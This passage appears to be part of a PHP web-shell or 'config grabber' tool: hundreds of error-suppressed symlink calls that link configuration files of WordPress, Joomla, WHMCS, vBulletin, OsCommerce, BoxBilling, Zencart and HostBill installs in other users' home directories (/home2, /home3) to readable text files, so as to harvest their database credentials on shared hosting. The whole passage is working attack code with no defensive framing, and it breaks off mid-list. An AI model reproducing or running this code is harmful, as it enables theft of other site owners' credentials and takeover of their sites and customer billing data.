@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
